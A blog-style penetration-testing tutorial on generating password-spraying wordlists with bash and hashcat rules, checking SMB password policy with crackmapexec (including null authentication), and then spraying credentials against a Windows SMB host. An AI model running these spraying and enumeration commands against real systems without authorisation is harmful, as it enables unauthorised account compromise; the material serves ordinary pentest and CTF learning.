# Using Hashcat and a bit of Bash to generate password lists


<!-- {{< image src="/img/hashcat-logo.png" alt="Hashcat Logo" position="center" style="border-radius: 8px;" >}} -->

Let's use hashcat to generate a custom word-list we can make use of with password spraying attacks. Users typically have passwords that have a set pattern, such as if a company has a policy of resetting passwords monthly it is not surpring to find that users have their password contain the current Month of the year. Prehaps a companies password policy is longer you could then expect users to use seasons as part of their password.

Lets start with quickly adding all the months into a "candidate" file we can do this with a quick python one-liner. 
```bash
python -c "import calendar;[print(calendar.month_name[i]) for i in range(1,13)]" > candidate.passwords
```
Lets go ahead and add some more common passwords

`vim candidate.passwords`
{{< admonition type=example title="Our wordlist" open=true >}}
January

February

March

April

May

June

July

August

September

October

November

December

Password

P@ssw0rd

Secret

123456

123456789

qwerty

111111

12345678

abc123

1234567

password1

12345

iloveyou

monkey

dragon
{{< /admonition >}}

At this point you'll want to add that extra spice to this list by doing some OSINT on your target. Adding things such as the company name, or even the name of the technology/tool you are trying to break into. Additional using a tool like [CeWL](https://github.com/digininja/CeWL/) is great for pulling lots of data from a website and generating an even bigger wordlist.

Lets add even more entropy to our new password list by adding the year to the end of each candidate password and then an ! to the end of each potential passwords.

## Add the year to end of each password
```bash
for i in $(cat candidate.passwords); do echo $i; echo ${i}2020; done >  tmp; cp tmp candidate.passwords 
```
## Add an ! to end of each password
```bash
for i in $(cat candidate.passwords); do echo $i; echo ${i}\!; done > tmp; cp tmp candidate.passwords 
```
 Finally to really add some randomness to our custom list we can use hashcat and some rule files to generate thousands of variants of our candidate passwords. To do so we use the `--stdout` flag in hashcat to print the output to, surprisingly, standout. One of the great features of hashcat is the ability to use a rule file to generate variance. This is done by giving setting the `-r` flag and a path to your rule file.

 You can find lots of rule files in the hashcat github [repo](https://github.com/hashcat/hashcat/tree/master/rules) but for this example we will just use the [best64.rule](https://github.com/hashcat/hashcat/blob/master/rules/best64.rule)

 ## Lets quickly download the rules with `wget`

 ```bash
wget https://raw.githubusercontent.com/hashcat/hashcat/master/rules/best64.rule
 ```

Now lets apply our rules with hashcat. Notice `--force` flag to ensure hashcat runs even with a CPU.
```bash
hashcat --force --stdout candidate.passwords -r best64.rule > password.list
```
We should now have thousands of words in this password list now. We can can go futher and even change additional rule files to get even more variants on what started out as simply the months of the year and some common passwords.

We now have thousands of passwords which is too many for a password spraying attack. We can use bash to cut down on some of the fat.

## Fine tuning the list
### Remove duplicate passwords
```bash
cat password.list | sort -u > tmp; cp tmp password.list
```

### Keep passwords that are over a certain length
```bash
cat password.list | awk 'length($0) > 7' > tmp; cp tmp password.list
```

Now we have prepared our password list before using it we should check the password policy. Just incase we block a user out of their account due to too many failed authentication attempts. If we were attack a windows machine we can use [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) to check the password policy for a SMB share.

```bash
crackmapexec smb 192.168.1.25 --pass-pol
```

If that does not work you can try a null authentication, this tends to work on windows servers that have been upgraded from 2003. This is due for new domain installations not allowing by default null authentication.

```bash
crackmapexec smb 192.168.1.25 --pass-pol -u '' -p ''
```
```bash
CMB 192.168.1.25:445 DOMAIN    [*] Windows 10.0 Build 14393 (name:DOMAIN) (domain:FOO)
CMB 192.168.1.25:445 DOMAIN    [+] Dumping password policy
CMB 192.168.1.25:445 DOMAIN    Minimum password length: 7
CMB 192.168.1.25:445 DOMAIN    Password history length: 24
CMB 192.168.1.25:445 DOMAIN    Maximum password age: 42 days 23 hours 52 minutes
CMB 192.168.1.25:445 DOMAIN    Minimum password age: 23 hours 52 minutes
CMB 192.168.1.25:445 DOMAIN    Account lockout threshold: 0
CMB 192.168.1.25:445 DOMAIN    Account lockout duration: None
```

Things to look out for in the output would be the minimum password length, we could use this to tune our password list and the information on account lockouts. Which in the above example is set to 0 hence we are safe to spray our passwords without the fear of locking out users.

You are now ready to begin your attack. In the case of windows SMB you could use either:

#### crackmapexec
```bash
crackmapexec smb 192.168.1.25 -u user.list -p password.list
```
or metasploit console has a nice module called `smb_login`.


There is many ways you could expand this further to create more precise wordlists against your target. Doing good recon on a target can yeild some great potential passwords, such as including user names, birthdays. Obviously there is infinite possibilites but these techniques can be used to quickly generate at least some of those infinite possibilites.



## References
1. [ippsec - forest](https://www.youtube.com/watch?v=H9FcE_FMZio)

